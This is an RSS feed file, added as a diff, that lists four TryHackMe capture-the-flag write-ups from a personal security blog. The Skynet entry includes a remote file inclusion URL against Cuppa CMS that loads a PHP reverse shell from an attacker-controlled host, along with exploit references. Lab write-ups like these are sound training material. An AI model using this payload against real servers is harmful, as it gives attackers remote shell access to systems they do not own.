@@ -1,0 +1,236 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>cms on Blog</title>
+    <link>https://martinkubecka.github.io/tags/cms/</link>
+    <description>Recent content in cms on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Sun, 11 Apr 2021 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://martinkubecka.github.io/tags/cms/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>CMesS [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/posts/thm/cmess/</link>
+        <pubDate>Sun, 11 Apr 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sun, 11 Apr 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/posts/thm/cmess/</guid>
+        <description>Title  CMesS     Info  Can you root this Gila CMS box?   Difficulty  Medium   Date 2021/04/11    Scanning &amp;amp; Enumeration We are given a host with IP address 10.10.93.26. Before performing any scanning or enumeration, we will add 10.10.93.26 cmess.thm to our hosts file located in the /etc directory.
+Nmap Let&amp;rsquo;s start by running a port scan on the host using nmap.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/cmess/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+            
+              <category>remote code execution</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Anthem [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/posts/thm/anthem/</link>
+        <pubDate>Sat, 21 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 21 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/posts/thm/anthem/</guid>
+        <description>Title Anthem     Info Exploit a Windows machine in this beginner level challenge.   Difficulty Easy    Website Analysis Let&amp;rsquo;s run nmap and check what ports are open.
+What port is for the web server?
+
+What port is for remote desktop service?
+
+What is a possible password in one of the pages web crawlers check for?
+
+What CMS is the website using?</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/anthem/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Windows</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Ignite [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/posts/thm/ignite/</link>
+        <pubDate>Fri, 20 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Fri, 20 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/posts/thm/ignite/</guid>
+        <description>Title Ignite     Info A new start-up has a few issues with their web server.   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 
+Reconnaissance 
+
+Gaining Access fuelCMS Exploitation 
+
+
+
+
+Privilege Escalation</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/ignite/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Skynet [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/posts/thm/skynet/</link>
+        <pubDate>Sat, 14 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 14 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/posts/thm/skynet/</guid>
+        <description>Title Skynet     Info A vulnerable Terminator themed Linux machine.   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 
+
+Directory Brute-Forcing 
+
+Samba 
+
+
+
+
+Accessing Webmail 
+
+
+Further Enumeration 
+
+
+
+Gaining Access Cuppa CMS Exploitation 
+
+https://www.exploit-db.com/exploits/25971
+ http://10.10.201.252/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.140.180:8888/php-reverse-shell.php
+ 
+
+Privilege Escalation 
+
+ https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/skynet/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>smb</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
